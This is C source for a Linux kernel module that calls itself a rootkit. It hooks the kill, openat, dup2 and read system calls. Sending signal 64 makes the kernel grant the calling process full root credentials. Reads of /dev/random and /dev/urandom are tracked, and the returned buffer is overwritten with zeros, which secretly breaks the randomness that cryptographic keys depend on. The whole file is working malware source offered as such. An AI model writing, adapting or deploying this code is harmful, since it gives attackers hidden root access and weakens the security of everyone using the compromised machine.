#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include "hooking.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal number, used to request a privilege escalation to root
#define ROOTI_SIG_PE 64

/*
    This struct stores some file descriptor that is of interest to us which was opened
    by some usermode process. This struct would be initialized in a hook for some open-like syscall
    and read in a hook for some read-like or write-like syscall whenever we want to tamper with file I/O.
*/
struct rooti_tamper_fd {
    int fd;     // file descriptor number
    pid_t pid;  // PID of the owner
};

// TODO: implement a linked-list of tempered FDs instead of this
struct rooti_tamper_fd _rand_tamper_fd;

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
static asmlinkage long (*orig_read)(const struct pt_regs *regs);

static int elevate_privilege(void)
{
    // Prepare new set of credentials
    struct cred *creds = prepare_creds();
    if (creds == NULL) {
        printk(KERN_DEBUG "rooti: prepare_creds() failed, out of memory\n");
        return -ENOMEM;
    }

    // Elevate identifiers to those of user & group root
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    // Commit new set of credentials in the context of the process in execution
    commit_creds(creds);

    return 0;
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == ROOTI_SIG_PE) {
        return elevate_privilege();
    }
    return orig_kill(regs);
}

static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    char *filepath_user = (char *)regs->si;
    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
    if (filepath_kernel == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory");
        return orig_openat(regs);
    }

    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed");
        kfree(filepath_kernel);
        return orig_openat(regs);
    }
    
    if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
        pid_t pid = current->pid;
        int fd = orig_openat(regs);
        _rand_tamper_fd.fd = fd;
        _rand_tamper_fd.pid = pid;
        kfree(filepath_kernel);
        return fd;
    }

    kfree(filepath_kernel);
    return orig_openat(regs);
}

static asmlinkage long hook_dup2(const struct pt_regs *regs) {
    pid_t pid = current->pid;
    int oldfd = regs->di;
    int newfd = orig_dup2(regs);
    if (pid == _rand_tamper_fd.pid && oldfd == _rand_tamper_fd.fd) {
        _rand_tamper_fd.fd = newfd;
    }
    return newfd;
}

static asmlinkage long hook_read(const struct pt_regs *regs) {
    pid_t pid = current->pid;
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;

    size_t nread = nread = orig_read(regs);;
    if (_rand_tamper_fd.pid != pid || _rand_tamper_fd.fd !=fd) {
        return nread;
    }
    char *kernel_buf = kzalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory");
        return nread;
    }

    int err = copy_to_user(user_buf, kernel_buf, count);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_to_user() failed");
        kfree(kernel_buf);
        return nread;
    }

    kfree(kernel_buf);
    return nread;
}

// List of system calls to hook :D
struct rooti_syscall_hook hooks[] = {
    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill),
    ROOTI_HOOK("sys_openat", hook_openat, &orig_openat),
    ROOTI_HOOK("sys_dup2", hook_dup2, &orig_dup2),
    ROOTI_HOOK("sys_read", hook_read, &orig_read),
};


/* LKM initialization */
static int __init rooti_init(void)
{
    printk(KERN_INFO "rooti: init\n");
    
    int ret = rooti_hooking_init();
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
        return ret;
    }

    // Install hooks :D
    ret = rooti_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
        return ret;
    }

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    printk(KERN_INFO "rooti: exit\n");
    rooti_uninstall_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rooti_init);
module_exit(rooti_exit);
